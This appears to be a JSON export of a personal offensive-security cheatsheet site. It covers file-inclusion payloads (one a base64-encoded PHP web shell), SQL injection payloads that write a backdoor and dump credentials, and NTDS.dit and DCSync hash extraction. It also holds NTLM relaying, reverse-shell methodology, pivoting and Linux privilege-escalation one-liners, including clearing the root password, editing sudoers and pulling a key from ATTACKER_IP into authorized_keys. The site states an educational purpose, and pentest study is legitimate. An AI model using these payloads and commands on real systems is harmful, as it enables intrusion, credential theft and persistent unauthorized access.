index.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4= \nRemote File Inclusion # You can use PHP wrapper to execute code instead of hosting payload \u0026lt;?php $code = file_get_contents(\u0026#39;path/index.php\u0026#39;); echo $code; ?\u0026gt; ?lang=data://text/plain;base64,PD9waHANCg0KJGNvZGUgPSBmaWxlX2dldF9jb250ZW50cygnL2NoYWxsZW5nZS93ZWItc2VydmV1ci9jaDEzL2luZGV4LnBocCcpOw0KZWNobyAkY29kZTsNCg0KPz4= # You can use pastebin and # (%23) ?lang=http ://pastebin.com/raw.php?i=Qbsbgvpk%23"
},
{
	"uri": "/recon-enumeration/port-scanning/masscan_cheatsheet/",
	"title": "Masscan Cheatsheet",
	"tags": [],
	"description": "",
	"content": " Usage and Options Target speficication # Target specification masscan 10.0.0.1 masscan 10.0.0.0/24 192.168.1.0/24 # Exclude IP file masscan 10.0.0.1/24 --excludeFile \u0026lt;file\u0026gt; # Exclude a single IP from the scan masscan 180.215.0.0/16 --exclude=180.215.122.120 Port specification # Port specification masscan 10.0.0.0.1 -p 80 masscan 10.0.0.0.1 -p 0-65535 masscan 10.0.0.0.1 -p 80,443 # UDP Scan masscan 10.0.0.0.1 -pU 53 Timing and Performance # Used to scan in offline mode # It does not send any traffic but just estimate the time length masscan 0.0.0.0/24 --offline # Using the rate to send X packets per second masscan 10.0.0.1/24 --rate 10000# Get banners from services (only few protocols supported) # Problem is that masscan uses his own TCP/IP stack so when the local system # received a SYN-ACK from the probed target, it responds with a TST packet that # kills the connection before the banner information can be grabbed. # You can use --source-ip to assign another IP to prevent masscan 10.0.0.1 --banners # Assign masscan to another IP masscan 10.0.0.1 --source-ip 192.168.1.200 # Include a ping masscan 10.0.0.1 --ping # Change the default user agent masscan 10.0.0.1 --http-user-agent \u0026lt;user-agent\u0026gt; # Report only open ports masscan 10.0.0.1 --open-only # Save sent packet in PCAP masscan 10.0.0.1 --pcap \u0026lt;filename\u0026gt; # Print packets in terminal (ok in low rate but RIP terminal with high rates) masscan 10.0.0.1 --packet-trace \nOutput # Output in binary mode massscan 10.1.1.1/24 -p 80 -oB \u0026lt;filename\u0026gt; # Output in XML format massscan 10.1.1.1/24 -p 80 -oX \u0026lt;filename\u0026gt; # Output in grepable format massscan 10.1.1.1/24 -p 80 -oG \u0026lt;filename\u0026gt; # Output in JSON format massscan 10.1.1.1/24 -p 80 -oJ \u0026lt;filename\u0026gt; # Output in simple list format massscan 10.1.1.1/24 -p 80 -oL \u0026lt;filename\u0026gt; # Read a binary output and writes it to the console masscan --readscan bin-test.scan # Read a binary scan and convert it to another format masscan --readscan bin-test.scan -oX bin-test.xml \nComplete commands # Quick port identification # - Subnet target # - Port range # - High speed masscan 10.1.1.1/24 -p 0-65535 --rate 1000000 --open-only --http-user-agent \\ \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0\u0026#34;\\  -oL \u0026#34;output.txt\u0026#34; # Multiple targets specific scan # - Known ports # - Fast rate 100.000 # - Banner grabbing and another source IP # - Only open ports # - Modified user-agent masscan \u0026lt;target1\u0026gt; \u0026lt;target2\u0026gt; \u0026lt;target3\u0026gt; -p 80,433 --rate 100000 --banners --open-only\\ --http-user-agent \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0\u0026#34;\\ --source-ip 192.168.100.200 -oL \u0026#34;output.txt\u0026#34; # TOP 20 ports scanning # Modified user-agent # Medium speed masscan \u0026lt;target\u0026gt; -p 21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080\\ --http-user-agent \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0\u0026#34;\\ --rate 100000 --oL \u0026#34;output.txt\u0026#34;"
},
{
	"uri": "/shells-methods/methodology/",
	"title": "Methodology",
	"tags": [],
	"description": "",
	"content": " GOLD COMMAND # which is gold command which which ls find python python3 perl bash sh dash xterm php jsp java asp socat\\ nc ncat netcat nc.traditional nc.openbsd ruby wget curl fetch lua gawk awk tclsh  \nMethodology _ Keep it simple, test for very basic things. | | |________ Which languages are interpreted by the servers, try to upload some simple echo | | | | | |____ Found php ? Check echo about system, passthru, shell_exec, exec to see if you can use them | | |________ Check commons binaries available on the system using which, locate, or by searching binaries | at /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin | | | | | |____ which which ls find python perl bash sh dash xterm php jsp java asp socat nc ncat netcat nc.traditional nc.openbsd ruby wget curl fetch lua gawk awk tclsh | | | |________ Try to get a reverse shell at port 443, then 80, if not working | | | | | | | |____ Open 2000 ports on your server using nc | | for port in {1..2000};do nc -nlvp $port \u0026amp;;done | | | | | |____ Ask the target server to connect to those ports | | for port in {1..2000};do curl -X GET http://IP:$port/acknak | | 2\u0026gt;\u0026amp;1;done | | | | | | | |____ Repeat until you iterated all ports | | | | | | | |____ Reverse Shell on the port you've been hit | | | | |________ Still not working ? Go bind shell | | |_____ Test port 443, 80, then try the nc opening ports tricks by swapping the server/client role  "
},
{
	"uri": "/windows-systems/post-exploitation-techniques/ntds_database/",
	"title": "NTDS Database",
	"tags": [],
	"description": "",
	"content": " # Initial location of the NTDS database on the domain controller C:\\Windows\\NTDS\\NTDS.dit # Step 1 → Finding a way to get the NDTS.dis and SYSTEM file # Step 2 → Crack/Analyze offline \nLocal Extraction VSSadmin # Récupération via VSSadmin # Create a Volume Shadow Copy C:\\Windows\\system32\u0026gt; vssadmin create shadow /for=C: # Retrieve NTDS from the copy C:\\Windows\\system32\u0026gt; copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy8\\windows\\ntds\\ntds.dit c:\\Extract\\ntds.dit # Copy SYSTEM file C:\\Windows\\system32\u0026gt; reg SAVE HKLM\\SYSTEM c:\\Extract\\SYS C:\\Windows\\system32\u0026gt; copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy8\\windows\\system32\\config\\SYSTEM c:\\Extract\\SYSTEM # Delete tracks C:\\Windows\\system32\u0026gt; vssadmin delete shadows /shadow={uuid} ntdsutil tool # ntdsutil is a builtin tool used to manage the AD # You can abuse it and create a backup of the ntds.dit file ntdsutil activate instance ntds ifm create full C:\\ntdsutil quit quit DC Sync / Mimikatz # DC Sync is a less noisy way to extract users informations # It uses the DRS (Directory Replication Service) # Classic mimikatz # lsadump::dcsync /domain:domain.lan /all /csv # Specific user mimikatz # lsadump::dcsync /domain:domain.lan /user:test PowerSploit # PowerSploit contains a script using the volume shadow copy service Import-Module .\\VolumeShadowCopyTools.ps1 New-VolumeShadowCopy -Volume C:\\ Get-VolumeShadowCopy # Also possible through a meterpreter session powershell_shell New-VolumeShadowCopy -Volume C:\\ Get-VOlumeShadowCopy Invoke-DCSync # Powershell script # Leverages PowerView, Invoke-ReflectivePEInjection and a DLL wrapper of PowerKatz Invoke-DCSync # Get other format (user:id:lm:ntlm) Invoke-DCSync -PWDumpFormat # It is also possible through a meterpreter session Nishang # Nishang is a post exploitation framework allowing attacker to perform attacks # You can use the Copy-VSS script to get NTDS.dit, SAM and SYSTEM files Import-Module .\\Copy-VSS.ps1 Copy-VSS Copy-VSS -DestinationDir C:\\ShadowCopy\\  # You can also use them throught a meterpretrer session by loading the powershell extension load powershell powershell_import /root/Copy-VSS.ps1 powershell_execute Copy-VSS # Also possible to establish a direct connection powershell_shell PS \u0026gt; Copy-VSS PS \u0026gt; Copy-VSS -DestinationDir C:\\Ninja \nRemote Extraction CrackMapExec crackmapexec xxx.xxx.xxx.xxx -u login -p password -d domain --ntds drsuapi WMI - Remote # It is possible to remotely extract the NTDS database using WMI and VSSADMIN wmic /node:dc /user:PENTESTLAB\\David /password:pentestlab123!! process call create \u0026#34;cmd /c vssadmin create shadow /for=C: 2\u0026gt;\u0026amp;1\u0026#34; wmic /node:dc /user:PENTESTLAB\\David /password:pentestlab123!! process call create \u0026#34;cmd /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\temp\\ntds.dit 2\u0026gt;\u0026amp;1\u0026#34; wmic /node:dc /user:PENTESTLAB\\David /password:pentestlab123!! process call create \u0026#34;cmd /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM\\ C:\\temp\\SYSTEM.hive 2\u0026gt;\u0026amp;1\u0026#34; NTDS Extraction and analysis # Impacket provides a usefull script to do that (decrypt copied files) impacket-secretsdump -system /root/SYSTEM -ntds /root/ntds.dit DOMAIN # Also possible to dump it remotely by using the computer account and its hash impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\\$@10.0.0.1 # Extraction is also possible using NTDSDumpEx NTDSDumpEx.exe -d ntds.dit -s SYSTEM.hive # Or adXtract ./adXtract.sh /root/ntds.dit /root/SYSTEM pentestlab Empire # Empire has 2 modules you can use to retrieve hashes through DCSync usemodule credentials/mimikatz/dcsync_hashdump usemodule credentials/mimikatz/dcsync"
},
{
	"uri": "/windows-systems/network-and-domain-recon/",
	"title": "Network and Domain Recon",
	"tags": [],
	"description": "",
	"content": " Table of Content  Network and Domain Recon  Out of domain (no credentials) Domain Recon Domain Mapping  Local and Physical  Local Recon Enumeration Physical Access  Exploitation  Exploitation Tricks CrackMapExec Impacket Kerberos RDP Exploitation File Transfer  Privilege Escalation  Admin and Processes LSASS and Mimikatz Windows Defender Tricks  Post Exploitation  NTDS Database Silver and Golden Tickets DC Shadow   "
},
{
	"uri": "/",
	"title": "Offensive Security Cheatsheet",
	"tags": [],
	"description": "",
	"content": " Offensive Security Cheatsheet Informations \u0026amp; Disclaimer 1/ This website is my personnal cheatsheet, a document used to centralize many informations about cybersecurity techniques and payloads. 2/ Content, commands and tools provided on this website can cause damages to websites and systems you might want want to use them against. Remember that is is illegal to scan or attack a resource that does not belong to you. 3/ Content is taken from my personnal experience but also from several online resources and cheatsheets. 4/ This website is for educationnal and \u0026quot;memo\u0026quot; purpose only. It does not aim to weaponize anyone. 5/ If you have any request (Something that is wrong, removing informations...) please do not hesitate to contact me on Twitter (@***REMOVED***).  \nTODO # OSINT --\u0026gt; Maltego # Windows --\u0026gt; Impacket # Web --\u0026gt; BurpSuite --\u0026gt; Postman # New Tricks --\u0026gt; postman --\u0026gt; greybox/enum/privesc windows --\u0026gt; Linux conf/host/privesc  \nAcknowledgments Special thanks to @Maki for teaching many tricks, methods and for the Hugo theme, but also to @_ACKNAK_ for the cheatsheet basis I started from, some months ago.\n"
},
{
	"uri": "/open-source-intelligence-osint/",
	"title": "Open Source Intelligence (OSINT)",
	"tags": [],
	"description": "",
	"content": " Table of Content  General  Firefox Add-ons  Technical Recon  Domains \u0026amp; IP Subdomain Enumeration Web Application Firewall (WAF) Dorks Company General Informations Public Documents and Metadata Photon MISC Frameworks \u0026amp; Correlation  Hosting \u0026amp; Repositories  Github Amazon \u0026amp; Digital Ocean Buckets  Human Recon  Social Networks E-mails Password Leaks Searching Someone Skiptracer Geolocation  Buscador  "
},
{
	"uri": "/windows-systems/network-and-domain-recon/no_credentials_recon/",
	"title": "Out of Domain (No credentials)",
	"tags": [],
	"description": "",
	"content": " Identification # Passiv network listening to identify machines sudo netdiscover -p -i eth0 # You can find the domain big using dig dig -x IP # If the NAC is blocking, you can listen broadcast and collect MAC address # Use printer\u0026#39;s MAC address to bypass NAC \nLLMNR / NBT-NS # You can Man in The Middle using LLMNR and NBT-NS if they\u0026#39;re bad configured sudo responder -I eth0 -wFv # If you get hashes, will be necessary to crack them john --format=netntlmv2 --wordlist=\u0026#34;/usr/share/wordlists/rockyou.txt\u0026#34; hash.txt  \nResponder and Multirelay # You can link responder and multi relay to own machines # It\u0026#39;s important to know that SMB Signing must be disabled on machines for multirelay. # SMB Server must also be off on Responder. Responder will intercept and MultiRelay will relay hashes # HTTP and SMB are OFF in Responder.conf responder -I eth0 -rv responder -I \u0026lt;interface\u0026gt; -r -d -w # You can check for machines with disabled SMB Signing with RunFinger (impacket) or CrackMapExec python RunFinger.py -i 10.0.2.0/24 cme smb \u0026lt;CIDR\u0026gt; --gen-relay-list targets.txt # Then you will target one machine or one range for MultiRelay python MultiRelay.py -t 10.0.2.4 -u ALL ntlmrelayx.py -tf targets.txt ntlmrelayx.py -tf targets.txt -c \u0026lt;insert your Empire Powershell launcher here\u0026gt; # Then you can pop an interactive shell # And use for example mimikatz mimi sekurlsa::logonpasswords \nSNMP Communities # You can use metasploit to enumerate known SNMP communities auxiliary/scanner/snmp/snmp_enum # OneSixtyOne is another tool onesixtyone \u0026lt;target\u0026gt; public # Bruteforce using a dict onesixtyone -c wordlist \u0026lt;target\u0026gt; # Or you can use snmp-check snmp-check -t 192.168.1.2 -c public/private"
},
{
	"uri": "/web-attacks/php-vulnerabilities/php_filters/",
	"title": "PHP Filters",
	"tags": [],
	"description": "",
	"content": " PHP Filters # Base64 ?inc=php://filter/read=convert.base64-encode/resource=config.php"
},
{
	"uri": "/network/pivot_techniques/",
	"title": "Pivot Techniques",
	"tags": [],
	"description": "",
	"content": " Proxychains Pivot # When you have access to a machine, you can use it as pivot to target machines # Getting known machines arp -a # Setup SSH Dynamic on the attacking box ssh -D \u0026lt;local_port\u0026gt; \u0026lt;user\u0026gt;@\u0026lt;ip\u0026gt; # Setup proxychains in /etc/proxychains.conf [ProxyList] socks4 127.0.0.1 \u0026lt;local_port\u0026gt; # Reduce timeout in /etc/proxychains.conf to gain speed tcp_read_time_out 800 tcp_connect_time-out 800 # Then proxychains...# If the compromised host is a Windows machine you still can use it as a pivot. # First, check if SSH is running → If not, you can install bitvise and run it (default settings) # Then, make sure you can SSH \nDouble Pivot Proxychains # Pivot 1 using proxychains ssh -D 1080 user@IP_Network1 # Configure /etc/proxychains to set port 1080 # Pivot 2 using proxychains proxychains ssh -D 1081 user@IP_Network2 # Configure /etc/proxychains to set port 1081 proxychains nmap... \nPort Forwarding # Windows plink.exe -l root -R 445:127.0.0.1:445 YOURIPADDRESS # Metasploit portfwd add -l 9090 -p 9090 -r TARGETIP # Reverse ssh tunnel, port forwarding 8090 from target to us: ssh -R 8090:localhost:8090 user@ip # Local port forward, forward local 8090 to target: ssh -L 8090:localhost:8090 user@ip"
},
{
	"uri": "/cryptography/rsa/",
	"title": "RSA Encryption",
	"tags": [],
	"description": "",
	"content": " Resources https://bitsdeep.com/posts/attacking-rsa-for-fun-and-ctf-points-part-1/ # Think about factordb.com to retrieve p and q from n \nTheory # Used # c → cyphertext # m → Plaintext message converted as a number # e → public exponent # d → private exponent # n → modulo =\u0026gt; p * q # Encrypt c = (m^e)[n] =\u0026gt; pow(m,e,n) # Decrypt m = (c^d)[n] =\u0026gt; pow(c,d,n) # 5 times encryption c = m^(e1 * e2 * e3 * e4 * e5) m = c^(d1 * d2 * d3 * d4 * d5) # Can get n and e from openssl like this cat alice_pubkey.pem | openssl rsa -pubin -inform PEM -text -noout \nTips \u0026amp; Tricks # Getting clear when you have c, d, n text = pow(c, d, n) # équivaut à text = (c^d)[n] result = hex(text) result = result.replace(\u0026#34;0x\u0026#34;, \u0026#34;\u0026#34;).replace(\u0026#34;L\u0026#34;, \u0026#34;\u0026#34;) print(result.decode(\u0026#39;hex\u0026#39;)) # Convert ASCII message to INT int(binascii.hexlify(m),16) # Convert INT message to ASCII binascii.unhexlify(hex(m).split(\u0026#39;x\u0026#39;)[1]) # Get n and e from a public key in Python from Crypto.PublicKey import RSA key = RSA.importKey(open(\u0026#34;public_key_path.pem\u0026#34;).read()) n = key.n e = key.e \nAttacks : Public Key + Message # Factorization Attack: → When n is small, go for factordb.com # Fermat Attack → When n is quite small # Low Exponent Attack: → Usefull when e=3 and n is quite big because pow(m,e,n) == pow(m,e) # ROCA: → Usable when RSA key has 512 bits long n # Twin Primes: → q = p + 2 → Usefull is most cases when n is too bid and others attacks doesn\\\u0026#39;t work # Boneh Durfee Attack: → Allows to go slightly faster then Wiener Attack because d \u0026lt; n^0.292 ```\t\u0026lt;br/\u0026gt; ### Attacks : Several public keys\t```bash # Chinese Remainder Attack → Usable when 3 messages have the same exponent (c= m^3 mod (n^b * n^c * n^d)) → chinese_reminder.py # Common Modulus Attack: → Usable when you have 2 messages, 2 public keys and n1 == n2 # Wiener Attack: → Usable when private exponen d is quite small compared to N (d \u0026lt; n^(1/4)) → https://github.com/rk700/attackrsa → attackrsa -t wiener -n N_VALUE -e E_VALUE \nRemote Service allowing to decrypt # Decipher Oracle in Python from pwn import * from Crypto.Util.number import * n = \u0026lt;\u0026gt; e = \u0026lt;\u0026gt; c1 = \u0026lt;\u0026gt; c2 = pow(2, e, n) c = c1*c2 # If it\u0026#39;s a process that is the Oracle r = process(\u0026#34;./oracle\u0026#34;) # If it\u0026#39;s a socket that is the Oracle # r = remote(\u0026#34;ip\u0026#34;,port) r.recvuntil(\u0026#34;where_firs_message_stop\u0026#34;) r.sendline(str(c)) res = r.recvline() res = r.recvline() dec = long_to_bytes(long(res.split(\u0026#34; \u0026#34;)[-1]) / 2) print(dec)"
},
{
	"uri": "/linux-systems/recon_enumeration/",
	"title": "Recon and Enumeration",
	"tags": [],
	"description": "",
	"content": " Resources https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ \nBasics hostname whoami id ifconfig uname -a uname -m # Check version using searchsploit -w distrib searchsploit -w kernel_version # Test trivials login combinaison # check /etc/passwd # then su login=password # Look for known machines arp -a # Get network configuration /sbin/ifconfig -a; cat /etc/network/interfaces; cat /etc/sysconfig/network; cat /etc/resolv.conf; cat /etc/sysconfig/network; cat /etc/networks; iptables -L; hostname; dnsdomainname # Find Linux distribution and version cat /etc/issue; cat /etc/*-release; cat /etc/lsb-release; cat /etc/redhat-release; # Get environment variables cat /etc/profile; cat /etc/bashrc; cat ~/.bash_profile; cat ~/.bashrc; cat ~/.bash_logout; env; set \nRunning Services netstat -lantp lsof -i sockstat -l ss -lantp # Find printers lpstat -a \nChecking Different Things # Check sudo rights sudo -l # User bash history cat ~/.bash_history; cat ~/.nano_history; cat ~/.atftp_history; cat ~/.mysql_history; cat ~/.php_history # Look for writable configuration files find /etc/ -writable -type f 2\u0026gt;/dev/null # Checks web config files or databases config files # If one of them is here, exploits can be compiled on the target machine which gcc g++ cc # Look for SUID or GUID binaries find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 6 -exec ls -ld {} \\; 2\u0026gt;/dev/null find / -perm -1000 -type d 2\u0026gt;/dev/null find / -perm -g=s -type f 2\u0026gt;/dev/null \nPspy # pspy is a command line tool designed to snoop on processes without need # for root permissions. It allows you to see commands run by other # users, cron jobs, etc. as they execute. https://github.com/DominicBreuker/pspy \nUsefull scripts https://github.com/pentestmonkey/unix-privesc-check https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh linux_enum.sh priv_esc.sh # Check for root cron jobs https://github.com/codingo/OSCP-2/blob/master/BASH/CronJobChecker.sh # LinuxPrivCheck https://github.com/codingo/OSCP-2/blob/master/BASH/LinuxPrivCheck.sh"
},
{
	"uri": "/open-source-intelligence-osint/technical-recon/frameworks-correlation/recon-ng/",
	"title": "Recon-ng",
	"tags": [],
	"description": "",
	"content": " General Informations https://bitbucket.org/LaNMaSteR53/recon-ng/wiki/Usage%20Guide # Its possible to add your own modules # Reconnaissance → Usage of open sources (passive) # Discovery → More active, packets sent to target # After loading a module, the context of the framework changes, and a new set of commands and options are available. # These commands and options are unique to the module. (help / show) \nUsage # Add API keys \u0026gt; keys add shodan_api \u0026lt;key\u0026gt; \u0026gt; keys list # Modules \u0026gt; show modules \u0026gt; search \u0026lt;string\u0026gt; \u0026gt; use recon/domains-hosts/builtwith \u0026gt; show infos \u0026gt; set \u0026lt;param\u0026gt; \u0026lt;value\u0026gt; # Workspaces \u0026gt; show workspaces \u0026gt; workspaces list \u0026gt; workspaces add Name \u0026gt; workspaces select \u0026lt;ws\u0026gt; # Add companies and domains to a schema \u0026gt; show schema \u0026gt; add compagnies company \u0026gt; add domains domain.com \u0026gt; show domains # Contacts \u0026gt; show contacts"
},
{
	"uri": "/web-attacks/server-side-injections/sql/",
	"title": "SQL Injections",
	"tags": [],
	"description": "",
	"content": " Resources https://websec.wordpress.com/tag/sql-filter-bypass/ # Cheat sheet https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md  \nGeneral and Tricks # Classical test ' or 1=1 LIMIT 1 -- ' or 1=1 LIMIT 1 -- - ' or 1=1 LIMIT 1# 'or 1# ' or 1=1 -- ' or 1=1 -- - admin\\'-- -  # Upload file union all select 1,2,3,4,\u0026quot;\u0026lt;?php echo shell_exec($_GET['cmd']);?\u0026gt;\u0026quot;,6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'  # Passwords uNiOn aLl SeleCt 1,2,3,4,conCat(username,0x3a,password),6 FroM users uNiOn aLl SeleCt 1,2,3,4,conCat(username,0x3a,password,0x3a,flag),6 FroM users  # Dump In One Shot (Shoot): \\' unIOn seLEct 1,make_set(6,@:=0x0a,(selEct(1)froM(information_schema.columns)whEre@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)#  # Virgule filtrée SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c //%0B pour espace possible  # sha1 binary # If sha1 is used as a binary string (true) you can use an hash to bypass conditions and inject SQL # http://pims.tuxfamily.org/blog/2011/04/write-up-sha1-is-fun-plaidctf/ # echo -n 3fDf | openssl sha1 -binary Q�u'='�@�[�t�- o��_- # GBK Charset # Possible to bypass addslashes and magic_quotes_gpc using chinese charset # \\x27 == ' # \\x5c == \\ # All chinese char starts with \\xbf # \\xbf\\x5c is a chinese char. It means that the antislash added will be interpreted as a part or chinese char and so the quote will be interpreted # where user.login=\u0026quot;\\xbf' or 1=1;  # Numerical \u0026amp;news_id=1 union select...  \nClassical String SQL Injection # Trigg recherche=’or 1 ; # Column number recherche=’ union select 666 ; → NOK recherche=’ union select 666,667 ; → OK # Database identification recherche=’ union select null,null from users ; recherche=’ union select @@version,null ; → NOK → No mysql / mssql recherche=’ union select versionnumber,null from sysibm.sysversions ; → NOK → Not a db2 recherche=’ union select version,null from v$instance ; → NOK → Not oracle recherche=’ union select version(),null ; → NOK → Not a postgres recherche=’ union select null,null from sqlite_master ; → OK → SQLITE # Tables list recherche=’ union select name,null from sqlite_master where type=’table’ ; # User table format recherche=’union select null,sql FROM sqlite_master WHERE tbl_name = ’users’ AND type = ’table’ ; # Data extraction recherche=’ union select username,password from users ; recherche=’ union select username,year from users ;  \nRouted SQL Injection # Routed → Double SQL Injection → The first result is injected into the second one login=admin\\\\' group by 1# s\\' group by 2-- d → 0x73272067726f757020627920322d2d2064 login=s\\' union select 0x73272067726f757020627920322d2d2064-- d s\\' group by 2-- ds\\' union select email, password from users-- d → 0x732720756e696f6e2073656c65637420656d61696c2c2070617373776f72642066726f6d2075736572732d2d2064  \nSQL Truncation # You can bypass some SQL restrictions playing with the var size limits # create table users (username varchar(10), password varchar(20)) ; # insert into users values(’admin’,’findMeIfYouCan’) ; # insert into users values(’admin [espace] *20 Mou’,’hackedMan’) ; → 2 admins added → Possible to add your own admin account  \nError-based SQL Injection # All is based on the output, you can then identify the SGBD # You want to generate errors # Get the db \u0026amp;order=,cast((chr(95)||current_database()) as numeric) # Get the table (using LIMIT/OFFSET allows iteration) order=,cast(( SELECT table_name FROM information_schema.tables WHERE table_catalog=current_database() LIMIT 1 OFFSET 1 ) as numeric) # Get columns order=,(cast(( SELECT column_name FROM information_schema.columns WHERE table_name=chr(109)||chr(51)||chr(109)||chr(98)||chr(114)||chr(51)||chr(53)||chr(116)||chr(52)||chr(98)||chr(108)||chr(51) LIMIT 1 OFFSET 0 ) as int)) # Extract rows from one column order=,(cast(( SELECT id||chr(32)||us3rn4m3_c0l||chr(32)||p455w0rd_c0l||chr(32)||em41l_c0l FROM m3mbr35t4bl3 LIMIT 1 OFFSET 0) as int))  \nInsert SQL Injection # Register form username=alex2\u0026amp;password=alex\u0026amp;email=@@version) ;# → OK but not executed username=alex3\u0026amp;password=alex\u0026amp;email=bla’),(’alex4’,’alex’,@@version) ;# → OK and executed ! username=alex5\u0026amp;password=alex\u0026amp;email=bla’),(’alex6’,’alex’,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() limit 0,1)) ;# username=alex7\u0026amp;password=alex\u0026amp;email=bla’),(’alex8’,’alex’,(SELECT column_name FROM information_schema.columns WHERE table_name=’flag’ limit 0,1)) ;#  \nLoad File SQL Injection # To read a file you need # the FILE right (allow you to use load_file() ) # The file full path # To get the full path for index.php (for example) ?action=members\u0026amp;id[]=1 # You can also use if there are some restrictions union all select 1,@@secure_file_priv,3,4 # Classic use union all select load_file('challenge/web-serveur/ch31/index.php'),2,3,4 # If quotes are filtered, you can use hexa union all select load_file(0x2f6368616c6c656e67652f7765622d736572766575722f636833312f696e6465782e706870),2,3,4 # Or id=(0)union(select(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),(0),(0),(0)from(member))'  \nTime Based SQL # You can use SQL properties → Testing from left to right → If first statement is false \u0026amp; followed by AND, the second won't be tested # Payload can be 1 AND [condition_a_tester] AND [si_condition_true] # Heavy Query : 1\u0026gt;(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C) # Test condition : exists(SELECT password FROM users WHERE id=1 AND ascii(substring(password,index,1))=codeascii) # Final payload 1 AND exists(SELECT password FROM users WHERE id=1 AND ascii(substring(password,index,1))=codeascii) AND 1\u0026gt;(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)  \nBlind SQL Injection # Get the password size username=admin'and (select length(password)\u0026gt;7)--+ # or admin' and length(password)=8-- # Enumerate password admin' and (select substr(password,1,1)='a')-- # or admin' and substr(password,1,1)='a'--  \nBypass Filters # Bypass whitespace %0B # Bypass case check for UNION UniOn SeLeCT # Bypass comma (UNION SELECT 1,2,3,4) UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d UNION SELECT * FROM (SELECT xxxx FROM xxxx LIMIT 1 OFFSET 0)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d  \nSQLite - UNION based without filters # Retrieve the table name login=admin\u0026quot; UNION SELECT group_concat(tbl_name),2 FROM sqlite_master WHERE type='table' AND tbl_name NOT like 'sqlite_%' limit 1 offset 1--\u0026amp;password=zzz # Get the table structure login=admin\u0026quot; UNION SELECT sql,2 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT like 'sqlite_%' AND name='users'--\u0026amp;password=zzz # Query one specific rowinfi login=admin\u0026quot; UNION SELECT login,2 FROM users LIMIT 1 OFFSET 2--\u0026amp;password=zzz  "
},
{
	"uri": "/web-attacks/server-side-injections/",
	"title": "Server Side Injections",
	"tags": [],
	"description": "",
	"content": " Table of Content  Server Side Injections Client Side Injections File Inclusions and Injections PHP Vulnerabilities Content Management Systems (CMS) Headers Injections MISC \u0026amp; Others  "
},
{
	"uri": "/open-source-intelligence-osint/human-recon/social-networks/",
	"title": "Social Networks",
	"tags": [],
	"description": "",
	"content": " Table of Content  General  Firefox Add-ons  Technical Recon  Domains \u0026amp; IP Subdomain Enumeration Web Application Firewall (WAF) Dorks Company General Informations Public Documents and Metadata Photon MISC Frameworks \u0026amp; Correlation  Hosting \u0026amp; Repositories  Github Amazon \u0026amp; Digital Ocean Buckets  Human Recon  Social Networks E-mails Password Leaks Searching Someone Skiptracer Geolocation  Buscador  "
},
{
	"uri": "/linux-systems/privilege-escalation/system_tricks/",
	"title": "System Tricks",
	"tags": [],
	"description": "",
	"content": " Resources https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/ https://marc.info/?l=full-disclosure\u0026amp;m=128776663124692\u0026amp;w=2 \nGeneral \u0026amp; Tricks # Look for strange process ps aux # Look for setuid programs (everyone can run them as root) find / -perm -4000 # Example, if perl perl -e ‘$ENV{PATH}=\u0026#34;/usr/bin\u0026#34;;system(\u0026#34;whoami\u0026#34;);’ → root # Get a TTY shell after a reverse shell connection python -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; # Set PATH TERM and SHELL if they\u0026#39;re missing export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin export TERM=xterm export SHELL=bash # Add public key to authorized keys echo $(wget https://ATTACKER_IP/.ssh/id_rsa.pub) \u0026gt;\u0026gt; ~/.ssh/authorized_keys # List processes running as root, permissions and NFS exports echo \u0026#39;services running as root\u0026#39;; ps aux | grep root; echo \u0026#39;permissions\u0026#39;; ps aux | awk \u0026#39;{print $11}\u0026#39;|xargs -r ls -la 2\u0026gt;/dev/null |awk \u0026#39;!x[$0]++\u0026#39;; echo \u0026#39;nfs info\u0026#39;; ls -la /etc/exports 2\u0026gt;/dev/null; cat /etc/exports 2\u0026gt;/dev/null # If /etc/passwd has incorrect permissions, you can root echo \u0026#39;root::0:0:root:/root:/bin/bash\u0026#39; \u0026gt; /etc/passwd; su \nPython sudoers # Add an user to sudoers in python #!/usr/bin/env python import os import sys try: os.system(\u0026#39;echo \u0026#34;username ALL=(ALL:ALL) ALL\u0026#34; \u0026gt;\u0026gt; /etc/sudoers\u0026#39;) except: sys.exit() \nTar wildcard + root cron # If a privilegied script is used to backup something or just uses tar * in a folder you have write access # You can exploit it to gain root access # Create 3 files in the folder touch -- 